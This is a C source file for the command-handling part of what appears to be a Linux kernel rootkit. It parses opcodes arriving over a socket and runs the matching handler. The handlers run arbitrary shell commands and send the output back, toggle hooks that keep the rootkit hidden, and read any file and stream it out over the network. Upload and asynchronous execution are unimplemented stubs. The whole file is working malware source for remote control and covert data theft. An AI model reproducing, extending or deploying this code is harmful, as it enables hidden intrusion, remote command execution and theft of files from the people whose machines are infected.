#include "commands.h"

#include <linux/module.h>
#include <linux/string.h>

#include "exec.h"
#include "hook.h"

// Lenght of the shortest valid (opcode+args) combo. currently `hide`
#define SHORTEST_PAYLOAD 1

#define USE_NETWORK(bufsz)                                                     \
    int status;                                                                \
    char buf[bufsz] = { 0 };                                                   \
    struct kvec vec = { 0 };                                                   \
    struct msghdr hdr = { 0 };

static int unimplemented(struct socket *sock, const char *cmd_name);
static int do_exec_sync(struct socket *sock, char *args);
static int do_exec_async(struct socket *sock, char *args);
static int do_hide(struct socket *sock, char *args);
static int do_upload(struct socket *sock, char *args);
static int do_download(struct socket *sock, char *args);

// map each command type to it's callback
static cmd_callback cmd_callbacks[] = {
    [CMD_EXEC_SYNC] = do_exec_sync, //
    [CMD_EXEC_ASYNC] = do_exec_async, //
    [CMD_HIDE] = do_hide, //
    [CMD_UPLOAD] = do_upload, //
    [CMD_DOWNLOAD] = do_download, //
};

int cmd_build(struct command *cmd, const char *payload)
{
    unsigned long cmd_len; // length of full command (opcode + args)
    unsigned long args_len; // length of args part only (without space)
    int i;

    if (!cmd || !payload)
    {
        pr_err("commands: failed to build command: empty cmd/payload.\n");
        return ERR_EMPTY;
    }

    cmd_len = strlen(payload);
    if (cmd_len < SHORTEST_PAYLOAD)
    {
        pr_err("commands: failed to build command: payload is too short.\n");
        return ERR_BAD_ARGS;
    }

    cmd->type = CMD_UNKNOWN;
    for (i = 0; i < CMD_UNKNOWN; ++i)
    {
        // opcode is a positive int, which maps to enum values
        if (payload[0] == i + '0')
        {
            cmd->type = i;
        }
    }

    if (cmd->type == CMD_UNKNOWN)
    {
        pr_err("commands: failed to build command: invalid opcode.\n");
        return ERR_BAD_OPCODE;
    }

    cmd->callback = cmd_callbacks[cmd->type];

    // Hide doesn't take args
    if (cmd->type == CMD_HIDE)
    {
        return 0;
    }

    if (cmd_len <= 2)
    {
        pr_err("commands: failed to build command: expected arguments.\n");
        return ERR_NO_ARGS;
    }

    args_len = cmd_len - 2; // opcode + space
    if (args_len >= MAX_ARGS_LEN)
    {
        pr_err("commands: failed to build command: args are too long.\n");
        return ERR_LONG_ARGS;
    }
    strncpy(cmd->args, payload + 2, args_len);
    cmd->args[args_len] = '\0';
    pr_info("commands: cmd_len: %lu, args_len: %lu, args: %s\n", cmd_len, args_len, cmd->args);

    return 0;
}

static int do_exec_sync(struct socket *sock, char *args)
{
    USE_NETWORK(128)
    int ret;
    char out_file[265] = { 0 };

    if ((ret = exec_sync(args, &status)) != 0)
    {
        // exec didn't happen, return non-zero
        sprintf(buf, "couldn't exec. internal error code %d\n", ret);
    }
    sprintf(buf, "> %s [STATUS: %d]\n", args, status);

    // Send status code:
    vec.iov_base = buf;
    vec.iov_len = strlen(buf);
    if ((ret = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
    {
        pr_warn("commands: couldn't send hide status message: %d\n", ret);
        return -1;
    }

    // Send output using file download:
    if (status == 0)
    {
        sprintf(out_file, "/rootkit/%s", get_last_outfile());
        return do_download(sock, out_file);
    }
    sprintf(out_file, "/rootkit/%s", get_last_errfile());
    return do_download(sock, out_file);
}

static int do_exec_async(struct socket *sock, char *args)
{
    return unimplemented(sock, "exec_async");
}

static int do_hide(struct socket *sock, char *args)
{
    USE_NETWORK(128)

    status = toggle_hooks();
    if (!status)
    {
        sprintf(buf, "hooks are off. rootkit is not sneaky anymore!\n");
    }
    else
    {
        sprintf(buf, "hooks are on. rootkit is invisible!\n");
    }
    vec.iov_base = buf;
    vec.iov_len = strlen(buf);
    if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
    {
        pr_warn("commands: couldn't send hide status message: %d\n", status);
        return -1;
    }
    return 0;
}

static int do_upload(struct socket *sock, char *args)
{
    return unimplemented(sock, "do_upload");
}

// Try to open file, send OK/KO status
// If OK, read file in chunks of 1024 and send them
// After last chunk is sent, send DONE
static int do_download(struct socket *sock, char *args)
{
    struct file *file = NULL;
    loff_t pos = 0;
    int len = 0;
    USE_NETWORK(1024); // chunk size is 1024

    file = filp_open(args, O_RDONLY, 0);
    if (IS_ERR(file))
    {
        sprintf(buf, "KO: couldn't open file");
        vec.iov_base = buf;
        vec.iov_len = strlen(buf);
        if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
        {
            pr_warn("commands: download: couldn't send status message: %d\n",
                    status);
            return -1;
        }
        pr_err("commands: download: couldn't open file %s", args);
        return 1;
    }

    while ((len = kernel_read(file, buf, 1024, &pos)) > 0)
    {
        vec.iov_base = buf, vec.iov_len = len;
        if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
        {
            pr_warn("commands: download: couldn't send file chunk: %d\n",
                    status);
            filp_close(file, NULL);
            return -1;
        }
    }

    filp_close(file, NULL);

    // Finished with file. Send DONE:
    sprintf(buf, "DONE\n");
    vec.iov_base = buf;
    vec.iov_len = strlen(buf);
    if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
    {
        pr_warn("commands: download: couldn't send DONE message: %d\n", status);
        pr_err("commands: download: CLI is still waiting, good luck handling "
               "this.\n");
        return -1;
    }

    return 0;
}

static int unimplemented(struct socket *sock, const char *cmd_name)
{
    USE_NETWORK(128)
    pr_err("commands: command %s is not implemented yet.\n", cmd_name);
    sprintf(buf, "%s is not implemented yet.\n", cmd_name);
    vec.iov_base = buf;
    vec.iov_len = strlen(buf);
    if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
    {
        pr_warn("commands: couldn't send %s status message: %d\n", cmd_name,
                status);
        return -1;
    }
    return 0;
}
